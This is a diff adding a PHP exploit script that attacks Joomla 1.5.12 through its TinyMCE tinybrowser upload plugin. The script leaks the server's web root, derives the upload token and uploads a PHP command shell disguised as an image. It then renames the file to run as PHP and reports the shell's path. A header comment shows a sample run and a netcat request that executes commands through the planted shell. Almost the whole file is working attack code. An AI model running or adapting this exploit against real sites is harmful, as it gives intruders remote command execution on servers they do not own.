@@ -1,0 +1,196 @@
+<?php
+
+/**
+ ** Joomla 1.5.12 Remote Code Execution via TinyMCE upload vulnerability
+ **
+ ** Tested against :
+ ** - Joomla 1.5.12 / Ubuntu 8.10 / Apache 2.2.9
+ ** - Joomla 1.5.12 / Windows XP SP2 / Apache 2.2.12
+ **
+ **  Luca "daath" De Fulgentis - daath [at] nibblesec.org
+ **  http://blog.nibblesec.org
+ **
+ **/
+
+/*
+daath@shaytan:~$ php pwnoomla.php localhost /joomla
+
+ [-] Joomla 1.5.12 RCE via TinyMCE upload vulnerability [-]
+
+ [#] Attacking localhost:80/joomla/
+ [+] Web root pathname is : /var/www/
+ [+] Magic token is a8de65e217ed779dbda80eb04502a2da
+ [#] Creating remote directory ... DONE
+ [#] Uploading image ... DONE
+ [#] Renaming image's extension (takes a while) ... PWNED!
+ [+] Here is the php shell : /joomla/images/stories/i208661849/shell.php
+
+daath@shaytan:~$ echo -e "GET /joomla/images/stories/i208661849/shell.php?cmd=ls%20-al%20shell.php HTTP/1.0\n\n" | nc localhost 80
+HTTP/1.1 200 OK
+Date: Mon, 28 Sep 2009 10:39:43 GMT
+Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.3 with Suhosin-Patch
+X-Powered-By: PHP/5.2.6-2ubuntu4.3
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html
+
+-rw-r--r-- 1 www-data www-data 54 Sep 28 12:39 shell.php
+daath@shaytan:~$ 
+*/
+
+
+ $host = "localhost";
+ $port = "80";
+ $install_path = "/";
+
+ $path    = "/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser";
+ $dir     = "/tinybrowser.php?type=image&folder=";
+ $upload  = "/upload_file.php";
+ $rename  = "/edit.php?type=file&folder=";
+
+ /*
+  * PHP shell
+  */
+ $php_shell = "<?php if(isset(\$_GET[\"cmd\"])) system(\$_GET[\"cmd\"]); ?>";
+
+ echo "\n [-] Joomla 1.5.12 RCE via TinyMCE upload vulnerability [-]\n\n";
+
+ if($argc < 2) {
+  echo " Usage: php {$argv[0]} host joomla_install_path\n";
+  echo " Example : php {$argv[0]} localhost /joomla/ \n\n";
+  exit(1);
+ }
+
+ $host = $argv[1];
+
+ if($argc == 3) {
+  $install_path = $argv[2][0] == "/" ? $argv[2] : "/".$argv[2];
+  $install_path = $argv[2][strlen($install_path)-1] == "/" ? $install_path : $install_path."/";
+ }
+
+ echo " [#] Attacking {$host}:{$port}{$install_path}\n";
+
+ $resp = HTTPRequest("GET {$install_path}/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/tinybrowser.php HTTP/1.0\r\n\r\n");
+ if(strstr($resp, "Restricted access")) {
+  die(" [-] Joomla is NOT vulnerable, exiting.\n\n");
+ }
+
+ $webroot = get_webroot_pathname();
+ if($webroot == "") {
+  die(" [-] Web root pathname NOT FOUND, exiting.\n\n");
+ }
+ 
+ echo " [+] Web root pathname is : {$webroot}\n";
+
+ $seed = md5($webroot . "s0merand0mjunk!!!111");
+ echo " [+] Magic token is {$seed}\n";
+
+ $my_dir = "i" . rand();
+ echo " [#] Creating remote directory ... ";
+ $resp = HTTPRequest("GET {$install_path}{$path}{$dir}/{$my_dir} HTTP/1.0\r\n\r\n");
+
+ if(!strstr($resp, "directory has been successfully created")) {
+  die("FAILED\n [-] Error - creating directory, exiting.\n\n");
+ }
+ echo "DONE\n";
+
+ $my_shell = md5(time());
+ echo " [#] Uploading image ... ";
+
+ $data  = "--1234567\r\n";
+ $data .= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"{$my_shell}.png\"\r\n\r\n";
+ $data .= "{$php_shell}\r\n";
+ $data .= "--1234567--\r\n";
+
+ $req  = "POST {$install_path}{$path}{$upload}" . "?obfuscate={$seed}&type=file&folder={$install_path}images/stories/{$my_dir} HTTP/1.1\r\n";
+ $req .= "Host: {$host}\r\n";
+ $req .= "Content-Length: ".strlen($data)."\r\n";
+ $req .= "Content-Type: multipart/form-data; boundary=1234567\r\n";
+ $req .= "Connection: close\r\n\r\n";
+ $req .= $data; 
+
+ $resp = HTTPRequest($req);
+
+ if (!strstr($resp,"File Upload Success")) {
+  die("FAILED\n [-] Error - image uploading, exiting.\n\n");
+ }
+ echo "DONE\n";
+
+ echo " [#] Renaming image's extension (takes a while) ... ";
+
+ $data  = "actionfile%5B0%5D={$my_shell}.png_&renameext%5B0%5D=php&renamefile%5B0%5D=shell.&sortby=name";
+ $data .= "&sorttype=asc&find=&showpage=0&action=rename&commit=\r\n\r\n";
+
+ $req  = "POST {$install_path}{$path}/edit.php?type=image&folder={$my_dir}%2F HTTP/1.1\n";
+ $req .= "Host: {$host}\r\n";
+ $req .= "Content-Type: application/x-www-form-urlencoded\r\n";
+ $req .= "Content-Length: " . strlen($data) . "\r\n\r\n";
+ $req .= $data;
+
+ $resp = HTTPRequest($req);
+
+ if(!strstr($resp, "1 files have been successfully renamed")) {
+  die("FAILED\n [-] Error - image's extension renaming, exiting.\n");
+ }
+ echo "PWNED!\n";
+
+ echo " [+] Here is the php shell : {$install_path}images/stories/{$my_dir}/shell.php\n\n";
+ exit;
+
+ function get_webroot_pathname() {
+
+  global $install_path;
+
+  $resp = HTTPRequest("GET {$install_path}/libraries/joomla/utilities/compat/php50x.php HTTP/1.\r\n\r\n");
+
+  $pos1 = strpos($resp, "in <b>");
+  $pos2 = strpos($resp, "libraries");
+
+  if($pos1 === false || $pos2 === false)
+   return "";
+
+  $init = $pos1 +strlen("in <b>");
+
+  $str = substr($resp, $init, $pos2-$init);
+
+  if($install_path != "/") {
+
+   $install_path2 = str_replace("/", "", $install_path);
+
+   $pos1 = strrpos($str, $install_path2);
+
+   if($pos1 === false)
+    return "";
+
+   $str = substr($str, 0, $pos1-1);
+  }
+
+  if($str[strlen($str)-1] == "\\")
+   $str = substr($str, 0, $pos-1);
+
+  if(strstr($str, "/") && $str[strlen($str)-1] != "/")
+   $str = $str . "/";
+
+  $pathname = str_replace("\\", "/", $str);
+  return $pathname;
+ }
+
+ function HTTPRequest($req) {
+
+  global $host, $port;
+
+  $s = @fsockopen($host, $port, $errno, $errstr, 10);
+  if(!$s) {
+   die("\n [-] Error in connection, exiting.\n\n");
+  }
+
+  fputs($s, $req);
+  $resp = "";
+  while(!feof($s)) {
+   $resp .= fgets($s);
+  }
+  fclose($s);
+
+  return $resp;
+ }
+?>
